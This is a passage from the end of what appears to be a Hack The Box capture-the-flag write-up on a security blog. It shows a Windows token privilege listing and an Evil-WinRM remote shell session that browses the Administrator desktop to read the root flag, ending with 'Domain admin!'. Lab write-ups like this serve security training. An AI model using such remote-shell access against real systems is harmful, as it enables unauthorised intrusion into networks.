+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; </code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mgtsvc$\Documents&gt; cd ../../Administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         4/15/2025   8:27 PM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+</code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sauna/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Sauna</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sizzle/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Sizzle</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
